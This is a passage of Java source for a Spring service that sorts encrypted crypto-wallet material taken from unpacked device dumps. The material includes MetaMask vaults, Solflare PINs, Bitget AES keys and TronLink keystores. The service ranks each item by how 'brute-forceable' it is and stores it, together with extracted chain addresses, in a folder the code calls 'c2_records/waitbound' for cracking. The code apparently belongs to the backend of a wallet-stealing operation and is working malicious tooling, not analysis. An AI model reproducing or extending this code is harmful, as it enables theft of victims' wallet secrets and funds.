package com.consumer.service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.consumer.config.ConsumerProperties;
import com.consumer.dao.DecryptTaskDao;
import com.consumer.entity.DecryptTaskEntity;
import com.consumer.util.BIP32Util;

import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;
import java.util.stream.Stream;

/**
 * 旁路：把「本次未能明文解出」的钱包加密材料落盘，并在 waitbound 记录路径。
 * <p>
 * 不参与助记词解密 / mnemonic 入库 / news4 派生；失败只打日志，不影响主流程。
 * Trust 不收集。密文落盘到 {@code {waitbound-dir}/{device}/{wallet}/}；
 * <b>一钱包一条</b>：{@code hex_content} 存该钱包目录绝对路径（不是单个文件）。
 * 同钱包可落多份配套材料（Solflare PIN+密文、Bitget 多文件等）。
 */
@Service
@Slf4j
public class EncryptedWalletArtifactCollector {

    /** 单文件上限（过大跳过）；Bitget db 等可到约 1MB */
    private static final int MAX_CONTENT_BYTES = 1024 * 1024;

    private static final char[] HEX = "0123456789abcdef".toCharArray();

    private static final Pattern B64_LINE = Pattern.compile("^[A-Za-z0-9+/=\\r\\n]+$");
    private static final Pattern UUID_TEXT = Pattern.compile(
            "^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$");
    private static final Pattern EVM_ADDR = Pattern.compile("0x[a-fA-F0-9]{40}\\b");
    private static final Pattern TRON_ADDR = Pattern.compile("T[1-9A-HJ-NP-Za-km-z]{33}");
    private static final Pattern TON_ADDR = Pattern.compile("[UE][Qq][A-Za-z0-9_-]{46}");
    private static final Pattern BTC_ADDR = Pattern.compile("(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}\\b");

    /** 常见代币合约，generic 扫描时排除 */
    private static final Set<String> EVM_CONTRACT_DENY = new HashSet<>(Arrays.asList(
            "0x0000000000000000000000000000000000000000",
            "0xdac17f958d2ee523a2206206994597c13d831ec7",
            "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
            "0x55d398326f99059ff775485246999027b3197955",
            "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"
    ));

    /**
     * 材料种类（内部用，用于优先级/文件名；入库的 encrypt_type 是算法名）。
     * 越高越像「真正可爆破」的入口文件。
     */
    private static final Map<String, Integer> KIND_PRIORITY = new HashMap<>();
    static {
        KIND_PRIORITY.put("metamask_vault_backup", 100);
        KIND_PRIORITY.put("metamask_keyring_controller", 90);
        // Solflare：default_encrypted=密文；passcode_vault=口令/PIN（常为短 Base64，如 8 字节）
        KIND_PRIORITY.put("solflare_default_encrypted", 110);
        KIND_PRIORITY.put("solflare_passcode_vault", 100);
        KIND_PRIORITY.put("solflare_sandbox", 40);
        KIND_PRIORITY.put("tonkeeper_encrypted_chunk", 100);
        KIND_PRIORITY.put("tonkeeper_sandbox", 40);
        // MyTonWallet：accounts JSON 才是账户/加密入口；secret_* 多为短密文片段
        KIND_PRIORITY.put("mytonwallet_accounts", 115);
        KIND_PRIORITY.put("mytonwallet_secret", 70);
        KIND_PRIORITY.put("mytonwallet_sandbox", 40);
        KIND_PRIORITY.put("okx_se_ptc", 100);
        KIND_PRIORITY.put("okx_aes_gcm_key", 80);
        KIND_PRIORITY.put("okx_sandbox_plist", 35);
        KIND_PRIORITY.put("phantom_vault_seed", 100);
        KIND_PRIORITY.put("uniswap_private_key", 100);
        KIND_PRIORITY.put("uniswap_mnemonic_blob", 90);
        KIND_PRIORITY.put("exodus_unused_data", 100);
        KIND_PRIORITY.put("tronlink_keystore", 120);
        KIND_PRIORITY.put("tronlink_hdwallet", 30); // 常为 APNS/Firebase plist，非 keystore
        KIND_PRIORITY.put("bitget_aes_key", 115);
        KIND_PRIORITY.put("bitget_bg_blob", 110);
        KIND_PRIORITY.put("bitget_db", 95);
        KIND_PRIORITY.put("bitget_prefs", 90);
        KIND_PRIORITY.put("bitget_pin_or_mnemonic_key", 20); // 多为 uuid 指针
        KIND_PRIORITY.put("bitget_config_wallet", 50);
        KIND_PRIORITY.put("coin98_mmkv_enc", 100);
        KIND_PRIORITY.put("tonhub_mmkv", 100);
        KIND_PRIORITY.put("imtoken_als", 50);
        KIND_PRIORITY.put("tokenpocket_f4secyr", 100);
        KIND_PRIORITY.put("tokenpocket_prefs", 85);
    }

    /** 允许同钱包落多份不同 kind 的钱包 */
    private static final Set<String> MULTI_KIND_WALLETS = new HashSet<>(Arrays.asList(
            "bitget", "tokenpocket", "mytonwallet", "tronlink", "okx", "solflare"
    ));

    @Resource
    private DecryptTaskDao decryptTaskDao;
    @Resource
    private ConsumerProperties consumerProps;

    /**
     * @param unpackDir        war 解压目录（含 files/hex、files/sandbox）
     * @param deviceId         设备号
     * @param ios18paramId     ios18param 主键
     * @param decryptedWallets 本次已成功解出助记词的钱包名（小写），这些钱包跳过收集
     */
    public int collectAndSave(String unpackDir, String deviceId, Integer ios18paramId,
                              Set<String> decryptedWallets) {
        if (unpackDir == null || unpackDir.trim().isEmpty()) {
            return 0;
        }
        Path root = Paths.get(unpackDir.trim());
        if (!Files.isDirectory(root)) {
            return 0;
        }
        Set<String> skip = new HashSet<>();
        // Trust 永不进 waitbound
        skip.add("trust");
        skip.add("trustwallet");
        skip.add("trust_wallet");
        if (decryptedWallets != null) {
            for (String w : decryptedWallets) {
                if (w != null && !w.isEmpty()) {
                    skip.add(w.toLowerCase(Locale.ROOT));
                }
            }
        }

        List<Artifact> arts = new ArrayList<>();
        try {
            Path hex = root.resolve("files").resolve("hex");
            Path sandbox = root.resolve("files").resolve("sandbox");
            if (Files.isDirectory(hex)) {
                collectHex(hex, skip, arts);
            }
            if (Files.isDirectory(sandbox)) {
                collectSandbox(sandbox, skip, arts);
            }
        } catch (Throwable t) {
            log.warn("【waitbound】扫描加密材料失败 device={} err={}", deviceId, t.toString());
            return 0;
        }

        if (arts.isEmpty()) {
            return 0;
        }

        // 过滤假材料后：按 wallet+kind 留最高分（配套多文件）；入库仍一钱包一行
        List<Artifact> filtered = new ArrayList<>();
        for (Artifact a : arts) {
            if (a == null || a.wallet == null || a.wallet.isEmpty()) continue;
            if (isJunkArtifact(a)) continue;
            filtered.add(a);
        }
        Map<String, Artifact> bestByWalletKind = new LinkedHashMap<>();
        for (Artifact a : filtered) {
            String w = a.wallet.toLowerCase(Locale.ROOT);
            boolean multi = MULTI_KIND_WALLETS.contains(w);
            String key = multi
                    ? w + "|" + (a.artifactKind == null ? "" : a.artifactKind)
                    : w;
            Artifact cur = bestByWalletKind.get(key);
            if (cur == null || score(a) > score(cur)) {
                bestByWalletKind.put(key, a);
            }
        }

        // 按钱包分组
        Map<String, List<Artifact>> byWallet = new LinkedHashMap<>();
        for (Artifact a : bestByWalletKind.values()) {
            String w = a.wallet.toLowerCase(Locale.ROOT);
            byWallet.computeIfAbsent(w, k -> new ArrayList<>()).add(a);
        }

        String safeDevice = sanitizePathPart(deviceId == null || deviceId.isEmpty() ? "unknown" : deviceId);
        Path baseDir = resolveWaitboundBase().resolve(safeDevice);
        double now = System.currentTimeMillis() / 1000.0;
        int inserted = 0;
        int walletsTouched = 0;
        for (Map.Entry<String, List<Artifact>> ent : byWallet.entrySet()) {
            String walletKey = ent.getKey();
            List<Artifact> list = ent.getValue();
            if (list == null || list.isEmpty()) continue;
            Artifact primary = list.get(0);
            for (Artifact a : list) {
                if (score(a) > score(primary)) {
                    primary = a;
                }
            }
            String walletName = primary.wallet;
            try {
                Path walletDir = baseDir.resolve(sanitizePathPart(walletName));
                Files.createDirectories(walletDir);
                int wrote = 0;
                for (Artifact a : list) {
                    String hash = shortHash(a.contentBytes);
                    Path diskPath = writeToDisk(baseDir, a.wallet, a.sourceFile, a.contentBytes, hash, a.artifactKind);
                    if (diskPath == null) continue;
                    wrote++;
                    try {
                        writeNormalizedSidecar(diskPath, a.contentBytes);
                    } catch (Throwable ignore) {}
                }
                if (wrote <= 0) {
                    continue;
                }
                walletsTouched++;
                try {
                    writeChainAddressesSidecar(walletDir, walletName, list, now);
                } catch (Throwable t) {
                    log.debug("【waitbound】chain_addresses 跳过 wallet={} err={}", walletName, t.toString());
                }
                String dirStr = walletDir.toAbsolutePath().normalize().toString().replace('\\', '/');

                Integer exist = decryptTaskDao.findIdByDeviceWallet(
                        deviceId == null ? "" : deviceId, walletName);
                if (exist != null) {
                    // 已有行：把 hex_content 纠正为目录（兼容旧「指文件」数据）
                    try {
                        decryptTaskDao.updateHexContentById(exist, dirStr);
                    } catch (Throwable t) {
                        log.debug("【waitbound】更新目录路径跳过 id={} err={}", exist, t.toString());
                    }
                    continue;
                }

                DecryptTaskEntity e = new DecryptTaskEntity();
                e.setDeviceId(deviceId == null ? "" : deviceId);
                e.setRowId(ios18paramId);
                e.setWalletName(walletName);
                e.setHexType(primary.hexType);
                e.setHexContent(dirStr);
                e.setEncryptType(primary.encryptAlgo == null ? "unknown" : primary.encryptAlgo);
                e.setResult("");
                e.setStatus(0);
                e.setSetTime(now);
                e.setUpdateTime(now);
                decryptTaskDao.insert(e);
                inserted++;
            } catch (Throwable t) {
                log.warn("【waitbound】写入跳过 wallet={} err={}", walletName, t.toString());
            }
        }
        if (inserted > 0 || walletsTouched > 0) {
            log.info("【waitbound】待爆破材料入库 count={} wallets={} filesKept={} scanned={} device={} dir={}",
                    inserted, walletsTouched, bestByWalletKind.size(), arts.size(),
                    deviceId, baseDir.toAbsolutePath());
        }
        return inserted;
    }

    /** 越高越优先 */
    private static int score(Artifact a) {
        int base = KIND_PRIORITY.getOrDefault(a.artifactKind, 10);
        if (a.sourceFile != null) {
            String p = a.sourceFile.toString().replace('\\', '/').toLowerCase(Locale.ROOT);
            if (p.contains("/files/hex/")) {
                base += 5;
            }
            String name = a.sourceFile.getFileName().toString().toLowerCase(Locale.ROOT);
            if (name.contains("default_encrypted") || name.contains("utc--")
                    || name.contains("6163636f756e7473") || name.startsWith("accounts")
                    || name.contains("aeskey") || name.contains("bg@@") || name.contains("bg_bg_")
                    || name.contains("bitkeep.db") || name.contains("f4secyr")
                    || name.contains("passcode_vault")) {
                base += 20;
            }
            if (name.contains("pin_code_key")
                    || name.contains("mnemonic_key_uuid") || name.contains("firebase")
                    || name.contains("apns") || name.contains("push")) {
                base -= 40;
            }
        }
        if (a.contentBytes != null && a.contentBytes.length > 0) {
            String kind = a.artifactKind == null ? "" : a.artifactKind.toLowerCase(Locale.ROOT);
            // Solflare PIN/口令本身就很短，不能按「体积分」惩罚
            if (kind.contains("passcode_vault") || kind.contains("aes_key") || kind.contains("aes_gcm")) {
                base += 5;
            } else if (a.contentBytes.length >= 32) {
                base += Math.min(12, a.contentBytes.length / 4096);
            } else {
                base -= 50;
            }
        }
        return base;
    }

    /** 明显不可爆破 / 误采材料 */
    private static boolean isJunkArtifact(Artifact a) {
        if (a.contentBytes == null || a.contentBytes.length == 0) {
            return true;
        }
        String kind = a.artifactKind == null ? "" : a.artifactKind.toLowerCase(Locale.ROOT);
        String name = "";
        if (a.sourceFile != null) {
            name = a.sourceFile.getFileName().toString().toLowerCase(Locale.ROOT);
        }
        int n = a.contentBytes.length;

        // Solflare passcode_vault：短 Base64/文本就是 PIN，必须保留
        if (kind.contains("passcode_vault") || name.contains("passcode_vault")) {
            String t = tryUtf8Text(a.contentBytes);
            if (t != null && !t.trim().isEmpty()) {
                return false;
            }
            // 非文本且极短才丢
            return n < 4;
        }
        if (kind.contains("bitget_pin") || name.contains("pin_code_key") || name.contains("mnemonic_key_uuid")) {
            String t = tryUtf8Text(a.contentBytes);
            if (t != null && UUID_TEXT.matcher(t.trim()).matches()) {
                return true;
            }
            if (n <= 40) {
                return true;
            }
        }
        if (kind.contains("tronlink_hdwallet") || name.contains("hdwallet")) {
            if (looksLikeApnsOrFirebasePlist(a.contentBytes)) {
                return true;
            }
        }
        if (n < 8 && !kind.contains("aes") && !kind.contains("key")) {
            return true;
        }
        return false;
    }

    private static boolean looksLikeApnsOrFirebasePlist(byte[] content) {
        if (content == null || content.length < 16) {
            return false;
        }
        List<String> strings = extractAsciiStrings(content, 4, 80);
        String joined = String.join(" ", strings).toLowerCase(Locale.ROOT);
        return joined.contains("aps-environment")
                || joined.contains("firebase")
                || joined.contains("gcm.token")
                || joined.contains("googleusercontent")
                || joined.contains("pushkit");
    }

    /**
     * 推断入库用的加密算法名。
     * 优先看内容指纹，再按材料种类回落钱包常见方案。
     */
    static String resolveEncryptAlgo(String artifactKind, byte[] content) {
        String sniffed = sniffEncryptAlgo(content);
        if (sniffed != null) {
            return sniffed;
        }
        String kind = artifactKind == null ? "" : artifactKind.toLowerCase(Locale.ROOT);
        if (kind.startsWith("metamask")) {
            return "PBKDF2+AES"; // browser-passworder / vault
        }
        if (kind.startsWith("coin98")) {
            return "CryptoJS-AES";
        }
        if (kind.contains("keystore") || kind.contains("tronlink_keystore")) {
            return "scrypt+AES-128-CTR";
        }
        if (kind.startsWith("tonhub")) {
            return "PBKDF2-SHA512+NaCl-secretbox";
        }
        if (kind.startsWith("solflare") || kind.startsWith("bitget")) {
            return "PIN+AES";
        }
        if (kind.startsWith("phantom") || kind.startsWith("tonkeeper")
                || kind.startsWith("okx") || kind.startsWith("tokenpocket")
                || kind.startsWith("imtoken") || kind.startsWith("mytonwallet")) {
            return "AES";
        }
        if (kind.startsWith("uniswap") || kind.startsWith("exodus")) {
            return "unknown"; // 常见为明文 JSON，算法不确定
        }
        return "unknown";
    }

    /** 从内容嗅探常见加密信封 */
    private static String sniffEncryptAlgo(byte[] content) {
        if (content == null || content.length < 8) {
            return null;
        }
        // CryptoJS OpenSSL Salted__
        if (content.length >= 8
                && content[0] == 'S' && content[1] == 'a' && content[2] == 'l'
                && content[3] == 't' && content[4] == 'e' && content[5] == 'd'
                && content[6] == '_' && content[7] == '_') {
            return "CryptoJS-AES";
        }
        String text = tryUtf8Text(content);
        if (text == null) {
            if (startsWithAscii(content, "bplist")) {
                return "bplist-blob";
            }
            return null;
        }
        String t = text.trim();
        if (t.startsWith("U2FsdGVk")) {
            return "CryptoJS-AES"; // Base64(Salted__)
        }
        String lower = t.toLowerCase(Locale.ROOT);
        // Ethereum / Trust / TronLink keystore V3
        if (lower.contains("\"crypto\"") && lower.contains("ciphertext")
                && (lower.contains("\"scrypt\"") || lower.contains("\"pbkdf2\""))) {
            if (lower.contains("scrypt")) {
                return "scrypt+AES-128-CTR";
            }
            return "PBKDF2+AES-128-CTR";
        }
        if (lower.contains("\"iv\"") && (lower.contains("\"data\"") || lower.contains("\"ciphertext\""))
                && (lower.contains("\"salt\"") || lower.contains("\"keymetadata\""))) {
            return "PBKDF2+AES";
        }
        return null;
    }

    /** {waitbound-dir}/{deviceId}/{wallet}/... */
    private Path resolveWaitboundBase() {
        String dir = consumerProps.getWaitboundDir();
        if (dir == null || dir.trim().isEmpty()) {
            dir = "D:/c2_records/waitbound";
        }
        return Paths.get(dir.trim());
    }

    private Path writeToDisk(Path deviceBase, String wallet, Path sourceFile,
                             byte[] content, String hash, String artifactKind) throws IOException {
        String safeWallet = sanitizePathPart(wallet);
        Path walletDir = deviceBase.resolve(safeWallet);
        Files.createDirectories(walletDir);

        // 稳定文件名：一钱包一份主材料；kind 仅用于文件名，不入库
        String kindPart = sanitizeFileName(artifactKind == null ? "blob" : artifactKind);
        String fileName = "payload_" + kindPart + "_"
                + hash.substring(0, Math.min(8, hash.length()));
        if (sourceFile != null) {
            String orig = sourceFile.getFileName().toString();
            int dot = orig.lastIndexOf('.');
            if (dot > 0 && dot < orig.length() - 1) {
                fileName += orig.substring(dot).toLowerCase(Locale.ROOT);
            } else {
                fileName += ".bin";
            }
        } else {
            fileName += ".bin";
        }
        fileName = sanitizeFileName(fileName);
        Path dest = walletDir.resolve(fileName);
        if (!Files.exists(dest)) {
            if (sourceFile != null && Files.isRegularFile(sourceFile)) {
                Files.copy(sourceFile, dest, StandardCopyOption.REPLACE_EXISTING);
            } else {
                Files.write(dest, content);
            }
        }
        return dest;
    }

    /**
     * 落盘旁路解析：能读懂的写成 sidecar，密文仍保留原文件。
     * <ul>
     *   <li>JSON → .pretty.json + .preview.json（标注加密字段）</li>
     *   <li>XML plist → .xml（可读文本）+ .preview.json</li>
     *   <li>bplist → .preview.json（meta + 可提取 ASCII 串）</li>
     *   <li>纯 base64 文本 → .decoded.txt / 再尝试 JSON</li>
     * </ul>
     */
    void writeNormalizedSidecar(Path dest, byte[] content) throws IOException {
        if (dest == null || content == null || content.length == 0) return;
        Path previewPath = Paths.get(dest.toString() + ".preview.json");
        if (Files.exists(previewPath)) return;

        Map<String, Object> preview = new LinkedHashMap<>();
        preview.put("source", dest.getFileName().toString());
        preview.put("size", content.length);

        // binary plist
        if (content.length >= 8 && startsWithAscii(content, "bplist")) {
            preview.put("format", "bplist");
            preview.put("note", "binary plist; ciphertext/keys may be nested; original file kept");
            List<String> strings = extractAsciiStrings(content, 4, 200);
            if (!strings.isEmpty()) {
                preview.put("ascii_strings", strings.size() > 80 ? strings.subList(0, 80) : strings);
            }
            writeJson(previewPath, preview);
            return;
        }

        String text = tryUtf8Text(content);
        if (text == null) {
            preview.put("format", "binary");
            preview.put("note", "non-text blob; original kept");
            List<String> strings = extractAsciiStrings(content, 6, 120);
            if (!strings.isEmpty()) {
                preview.put("ascii_strings", strings.size() > 40 ? strings.subList(0, 40) : strings);
            }
            writeJson(previewPath, preview);
            return;
        }

        String trimmed = text.trim();
        // XML plist
        if (trimmed.startsWith("<?xml") || trimmed.contains("<plist")) {
            preview.put("format", "xml_plist");
            Path xmlSide = Paths.get(dest.toString() + ".xml");
            if (!Files.exists(xmlSide)) {
                Files.write(xmlSide, trimmed.getBytes(StandardCharsets.UTF_8));
            }
            preview.put("sidecar", xmlSide.getFileName().toString());
            preview.put("note", "xml plist copied to .xml; may still contain encrypted values");
            writeJson(previewPath, preview);
            return;
        }

        // JSON
        if (trimmed.startsWith("{") || trimmed.startsWith("[")) {
            preview.put("format", "json");
            try {
                Object parsed = JSON.parse(trimmed);
                Path pretty = Paths.get(dest.toString() + ".pretty.json");
                if (!Files.exists(pretty)) {
                    Files.write(pretty, JSON.toJSONString(parsed, SerializerFeature.PrettyFormat)
                            .getBytes(StandardCharsets.UTF_8));
                }
                preview.put("sidecar", pretty.getFileName().toString());
                if (parsed instanceof JSONObject) {
                    JSONObject jo = (JSONObject) parsed;
                    List<String> encHints = new ArrayList<>();
                    for (String k : jo.keySet()) {
                        String lk = k.toLowerCase(Locale.ROOT);
                        if (lk.contains("data") || lk.contains("cipher") || lk.contains("vault")
                                || lk.contains("encrypt") || lk.equals("iv") || lk.equals("salt")
                                || lk.contains("mnemonic") || lk.contains("seed") || lk.contains("key")) {
                            Object v = jo.get(k);
                            String vs = v == null ? "" : String.valueOf(v);
                            encHints.add(k + ":" + (vs.length() > 64 ? vs.substring(0, 64) + "…" : vs));
                        }
                    }
                    if (!encHints.isEmpty()) {
                        preview.put("interesting_fields", encHints);
                        preview.put("note", "json pretty-printed; interesting fields may still be ciphertext");
                    } else {
                        preview.put("note", "json pretty-printed");
                    }
                } else {
                    preview.put("note", "json pretty-printed");
                }
            } catch (Exception e) {
                preview.put("note", "looks like json but parse failed: " + e.getMessage());
            }
            writeJson(previewPath, preview);
            return;
        }

        // base64-looking text
        String compact = trimmed.replaceAll("\\s+", "");
        if (compact.length() >= 16 && compact.length() % 4 == 0 && B64_LINE.matcher(compact).matches()) {
            preview.put("format", "base64_text");
            try {
                byte[] decoded = Base64.getDecoder().decode(compact);
                preview.put("decoded_size", decoded.length);
                Path decodedPath = Paths.get(dest.toString() + ".decoded.bin");
                if (!Files.exists(decodedPath)) {
                    Files.write(decodedPath, decoded);
                }
                preview.put("sidecar_bin", decodedPath.getFileName().toString());
                String inner = tryUtf8Text(decoded);
                if (inner != null) {
                    String it = inner.trim();
                    Path txt = Paths.get(dest.toString() + ".decoded.txt");
                    if (!Files.exists(txt)) {
                        Files.write(txt, it.getBytes(StandardCharsets.UTF_8));
                    }
                    preview.put("sidecar_txt", txt.getFileName().toString());
                    if (it.startsWith("{") || it.startsWith("[")) {
                        try {
                            Object parsed = JSON.parse(it);
                            Path pretty = Paths.get(dest.toString() + ".decoded.pretty.json");
                            if (!Files.exists(pretty)) {
                                Files.write(pretty, JSON.toJSONString(parsed, SerializerFeature.PrettyFormat)
                                        .getBytes(StandardCharsets.UTF_8));
                            }
                            preview.put("sidecar_json", pretty.getFileName().toString());
                        } catch (Exception ignore) {}
                    }
                    if (decoded.length >= 8 && startsWithAscii(decoded, "bplist")) {
                        preview.put("decoded_format", "bplist");
                        List<String> strings = extractAsciiStrings(decoded, 4, 200);
                        if (!strings.isEmpty()) {
                            preview.put("ascii_strings",
                                    strings.size() > 80 ? strings.subList(0, 80) : strings);
                        }
                    }
                } else if (decoded.length >= 8 && startsWithAscii(decoded, "bplist")) {
                    preview.put("decoded_format", "bplist");
                    List<String> strings = extractAsciiStrings(decoded, 4, 200);
                    if (!strings.isEmpty()) {
                        preview.put("ascii_strings",
                                strings.size() > 80 ? strings.subList(0, 80) : strings);
                    }
                }
                preview.put("note", "base64 decoded sidecar written; may still be ciphertext");
            } catch (Exception e) {
                preview.put("note", "base64-looking but decode failed: " + e.getMessage());
            }
            writeJson(previewPath, preview);
            return;
        }

        // plain text fallback
        preview.put("format", "text");
        preview.put("note", "utf-8 text; original kept");
        preview.put("head", trimmed.length() > 500 ? trimmed.substring(0, 500) + "…" : trimmed);
        writeJson(previewPath, preview);
    }

    private static void writeJson(Path path, Map<String, Object> obj) throws IOException {
        Files.write(path, JSON.toJSONString(obj, SerializerFeature.PrettyFormat)
                .getBytes(StandardCharsets.UTF_8));
    }

    /**
     * 从已落盘材料中提取可见链地址；仅当提取到至少一条地址时写入 {@code chain_addresses.json}。
     */
    void writeChainAddressesSidecar(Path walletDir, String walletName, List<Artifact> artifacts, double nowSec)
            throws IOException {
        if (walletDir == null || artifacts == null || artifacts.isEmpty()) {
            return;
        }
        ChainAddressAccumulator acc = new ChainAddressAccumulator();
        for (Artifact a : artifacts) {
            if (a == null || a.contentBytes == null || a.contentBytes.length == 0) {
                continue;
            }
            String sourceLabel = a.artifactKind == null ? "artifact" : a.artifactKind;
            extractAddressesFromArtifact(walletName, a, sourceLabel, acc);
        }
        if (acc.isEmpty()) {
            return;
        }
        Map<String, Object> root = new LinkedHashMap<>();
        root.put("wallet", walletName);
        root.put("note", "从落盘加密材料中提取的链地址，仅供人工核对；未破解前可能不完整");
        root.put("updated_at_sec", nowSec);
        root.put("chains", acc.toChainsMap());
        root.put("sources", acc.sources);
        Path out = walletDir.resolve("chain_addresses.json");
        writeJson(out, root);
    }

    private static void extractAddressesFromArtifact(String walletName, Artifact a, String sourceLabel,
                                                     ChainAddressAccumulator acc) {
        String kind = a.artifactKind == null ? "" : a.artifactKind.toLowerCase(Locale.ROOT);
        String text = tryUtf8Text(a.contentBytes);
        if (text != null) {
            String trimmed = text.trim();
            if (trimmed.startsWith("{") || trimmed.startsWith("[")) {
                try {
                    Object parsed = JSON.parse(trimmed);
                    if ("mytonwallet_accounts".equals(kind)) {
                        extractMyTonWalletAccounts(parsed, sourceLabel, acc);
                    } else if ("tronlink_keystore".equals(kind)) {
                        extractTronlinkKeystore(parsed, sourceLabel, acc);
                    } else if ("bitget_config_wallet".equals(kind)) {
                        extractBitgetConfigWallet(parsed, sourceLabel, acc);
                    } else if ("imtoken_als".equals(kind)) {
                        extractImtokenAls(parsed, sourceLabel, acc);
                    } else {
                        extractAddressesFromJsonTree(parsed, sourceLabel, acc, false);
                    }
                    return;
                } catch (Exception ignore) {
                    // fall through to text scan
                }
            }
            if ("imtoken_als".equals(kind)) {
                scanTextForNamedHints(trimmed, sourceLabel, acc);
            }
        }
        // 二进制 plist / blob：仅扫可打印串里的 TRON/EVM（保守）
        if (text == null && a.contentBytes.length <= 256 * 1024) {
            for (String s : extractAsciiStrings(a.contentBytes, 20, 200)) {
                classifyAndAdd(s, null, sourceLabel, acc, false);
            }
        }
    }

    private static void extractMyTonWalletAccounts(Object parsed, String source, ChainAddressAccumulator acc) {
        if (!(parsed instanceof JSONObject)) {
            return;
        }
        JSONObject root = (JSONObject) parsed;
        for (String accountKey : root.keySet()) {
            Object accountObj = root.get(accountKey);
            if (!(accountObj instanceof JSONObject)) {
                continue;
            }
            JSONObject byChain = ((JSONObject) accountObj).getJSONObject("byChain");
            if (byChain == null) {
                continue;
            }
            for (String chainKey : byChain.keySet()) {
                Object chainObj = byChain.get(chainKey);
                if (!(chainObj instanceof JSONObject)) {
                    continue;
                }
                String addr = ((JSONObject) chainObj).getString("address");
                if (addr == null || addr.isEmpty()) {
                    continue;
                }
                String chain = normalizeChainName(chainKey);
                if (chain != null) {
                    acc.add(chain, addr.trim(), source);
                }
            }
        }
    }

    private static void extractTronlinkKeystore(Object parsed, String source, ChainAddressAccumulator acc) {
        if (!(parsed instanceof JSONObject)) {
            return;
        }
        String hex = ((JSONObject) parsed).getString("address");
        if (hex == null || hex.isEmpty()) {
            return;
        }
        String tron = tronHexToBase58(hex);
        if (tron != null) {
            acc.add("tron", tron, source);
        }
    }

    private static void extractBitgetConfigWallet(Object parsed, String source, ChainAddressAccumulator acc) {
        if (!(parsed instanceof JSONObject)) {
            return;
        }
        JSONObject preview = ((JSONObject) parsed).getJSONObject("previewData");
        if (preview == null) {
            return;
        }
        JSONArray data = preview.getJSONArray("data");
        if (data == null) {
            return;
        }
        for (int i = 0; i < data.size(); i++) {
            Object row = data.get(i);
            if (!(row instanceof JSONObject)) {
                continue;
            }
            JSONObject jo = (JSONObject) row;
            String addr = jo.getString("address");
            if (addr == null || addr.isEmpty() || "0x".equalsIgnoreCase(addr.trim())) {
                continue;
            }
            String chain = normalizeChainName(jo.getString("chain"));
            if (chain == null) {
                chain = normalizeChainName(jo.getString("symbol"));
            }
            if (chain != null) {
                acc.add(chain, addr.trim(), source);
            }
        }
    }

    private static void extractImtokenAls(Object parsed, String source, ChainAddressAccumulator acc) {
        if (!(parsed instanceof JSONObject)) {
            return;
        }
        JSONObject jo = (JSONObject) parsed;
        String fp = jo.getString("sourceFingerprint");
        if (fp != null && !fp.isEmpty()) {
            classifyAndAdd(fp.trim(), "eth", source, acc, false);
        }
        extractAddressesFromJsonTree(jo, source, acc, true);
    }

    /** 递归 JSON：只认 address / sourceFingerprint 等字段，避免把 contract 当钱包地址 */
    private static void extractAddressesFromJsonTree(Object node, String source, ChainAddressAccumulator acc,
                                                     boolean imtokenMode) {
        if (node instanceof JSONObject) {
            JSONObject jo = (JSONObject) node;
            for (String key : jo.keySet()) {
                String lk = key.toLowerCase(Locale.ROOT);
                Object val = jo.get(key);
                if (val instanceof String) {
                    String s = ((String) val).trim();
                    if (s.isEmpty()) {
                        continue;
                    }
                    if ("address".equals(lk)) {
                        String chainHint = imtokenMode ? null : normalizeChainName(jo.getString("chain"));
                        classifyAndAdd(s, chainHint, source, acc, false);
                    } else if ("sourcefingerprint".equals(lk)) {
                        classifyAndAdd(s, "eth", source, acc, false);
                    } else if ("contract".equals(lk) || lk.endsWith("contract")) {
                        // skip token contracts
                    } else if (lk.contains("address") && !lk.contains("contract")) {
                        classifyAndAdd(s, null, source, acc, false);
                    }
                } else if (val instanceof JSONObject || val instanceof JSONArray) {
                    extractAddressesFromJsonTree(val, source, acc, imtokenMode);
                }
            }
        } else if (node instanceof JSONArray) {
            JSONArray arr = (JSONArray) node;
            for (int i = 0; i < arr.size(); i++) {
                extractAddressesFromJsonTree(arr.get(i), source, acc, imtokenMode);
            }
        }
    }

    private static void scanTextForNamedHints(String text, String source, ChainAddressAccumulator acc) {
        for (String line : text.split("\\R")) {
            String t = line.trim();
            if (t.contains("sourceFingerprint") || t.contains("address")) {
                for (String evm : collectMatches(EVM_ADDR, t)) {
                    classifyAndAdd(evm, "eth", source, acc, true);
                }
            }
        }
    }

    private static void classifyAndAdd(String raw, String chainHint, String source, ChainAddressAccumulator acc,
                                       boolean allowGenericEvm) {
        if (raw == null) {
            return;
        }
        String s = raw.trim();
        if (s.isEmpty()) {
            return;
        }
        if (chainHint != null) {
            String chain = normalizeChainName(chainHint);
            if (chain != null && looksLikeAddressForChain(chain, s)) {
                acc.add(chain, normalizeAddress(chain, s), source);
            }
            return;
        }
        if (TRON_ADDR.matcher(s).matches()) {
            acc.add("tron", s, source);
            return;
        }
        if (TON_ADDR.matcher(s).matches()) {
            acc.add("ton", s, source);
            return;
        }
        if (BTC_ADDR.matcher(s).matches()) {
            acc.add("btc", s, source);
            return;
        }
        if (s.startsWith("0x") && s.length() == 42 && EVM_ADDR.matcher(s).matches()) {
            if (!allowGenericEvm && EVM_CONTRACT_DENY.contains(s.toLowerCase(Locale.ROOT))) {
                return;
            }
            acc.add("eth", s, source);
            return;
        }
        if (s.length() == 42 && s.toLowerCase(Locale.ROOT).startsWith("41")) {
            String tron = tronHexToBase58(s);
            if (tron != null) {
                acc.add("tron", tron, source);
            }
        }
    }

    private static boolean looksLikeAddressForChain(String chain, String addr) {
        switch (chain) {
            case "eth":
            case "bsc":
                return addr.startsWith("0x") && addr.length() == 42;
            case "btc":
                return BTC_ADDR.matcher(addr).matches();
